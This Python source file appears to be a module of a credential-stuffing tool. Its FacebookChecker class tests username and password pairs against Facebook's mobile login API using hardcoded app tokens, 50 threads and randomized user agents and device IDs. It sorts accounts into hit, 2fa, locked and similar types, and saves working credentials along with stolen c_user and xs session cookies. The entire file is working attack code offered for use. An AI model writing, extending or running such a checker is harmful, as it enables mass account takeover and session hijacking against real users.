from core.base_checker import BaseChecker
from typing import Dict, Any
import requests
import uuid
from faker import Faker
import user_agent

class FacebookChecker(BaseChecker):
    """Facebook account checker"""
    
    LOGIN_URL = "https://graph.facebook.com/auth/login"
    
    def get_threads(self) -> int:
        return 50  # Facebook يتحمل 50 ثريد
    
    def generate_headers(self):
        fake = Faker()
        return {
            "Host": "graph.facebook.com",
            "User-Agent": user_agent.generate_user_agent(),
            "Content-Type": "application/json;charset=utf-8",
            "Accept-Encoding": "gzip",
        }
    
    def check_account(self, username: str, password: str) -> Dict[str, Any]:
        try:
            fake = Faker()
            headers = self.generate_headers()
            
            data = {
                "locale": "en_US",
                "format": "json",
                "email": username,
                "password": password,
                "access_token": "1792792947455470|f43b4b4c85276992ac952012f8bba674",
                "generate_session_cookies": 1,
                "adid": str(uuid.uuid4()),
                "device_id": str(uuid.uuid4()),
                "family_device_id": fake.uuid4(),
                "credentials_type": "device_based_login_password",
                "source": "device_based_login",
                "advertiser_id": str(uuid.uuid4()),
                "client_country_code": "US",
                "method": "auth.login",
                "fb_api_req_friendly_name": "authenticate",
                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                "api_key": "882a8490361da98702bf97a021ddc14d"
            }
            
            response = requests.post(self.LOGIN_URL, json=data, headers=headers, timeout=15)
            text = response.text.lower()
            
            account_data = {
                "login": username,
                "password": password,
                "type": "unknown",
                "cookies": ""
            }
            
            # تحليل الاستجابة
            if "c_user" in response.text:
                account_data["type"] = "hit"
                # استخراج الكوكيز
                try:
                    resp_json = response.json()
                    cookies = {c["name"]: c["value"] for c in resp_json.get("session_cookies", [])}
                    c_user = cookies.get("c_user", "")
                    xs = cookies.get("xs", "")
                    account_data["cookies"] = f"c_user={c_user}; xs={xs}"
                except:
                    pass
                should_save = True
                
            elif "must confirm" in text or ("must verify" in text and "invalid" not in text):
                account_data["type"] = "free"
                should_save = True
                
            elif "login appr" in text:
                account_data["type"] = "2fa"
                should_save = True
                
            elif "account is temporarily unavailable" in text:
                account_data["type"] = "locked"
                should_save = True
                
            else:
                account_data["type"] = "bad"
                should_save = False
            
            return {
                "status": "valid" if should_save else "bad",
                "account_data": account_data,
                "should_save": should_save
            }
            
        except Exception as e:
            return {"status": "error", "username": username, "error": str(e)}
    
    def should_save(self, account_data: Dict[str, Any]) -> bool:
        return account_data.get("type") in ["hit", "free", "2fa", "locked"]
    
    def save_format(self, account_data: Dict[str, Any]) -> str:
        base = f"{account_data['login']}:{account_data['password']} | type={account_data['type']}"
        if account_data.get("cookies"):
            base += f" | cookies={account_data['cookies']}"
        return base + "\n"
